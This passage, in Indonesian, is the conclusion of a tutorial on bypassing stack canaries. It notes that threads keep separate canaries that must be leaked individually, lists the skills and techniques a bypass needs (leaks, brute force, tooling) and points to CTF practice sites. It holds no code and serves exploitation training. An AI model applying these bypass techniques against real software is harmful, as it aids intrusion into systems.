### Thread-specific Canaries:
Pada program multithread, setiap thread punya canary sendiri yang perlu di-leak secara terpisah.

## Kesimpulan

Bypass stack canaries membutuhkan:
1. Pemahaman mendalam tentang layout stack
2. Kemampuan untuk membaca dan memanipulasi nilai di stack
3. Teknik yang tepat berdasarkan situasi (leak, brute force, dll.)
4. Tools yang membantu analisis dan exploit development

Practice makes perfect! Coba challenge binary exploitation di platform CTF seperti pwnable.tw, pwnable.kr, atau CTFtime.org
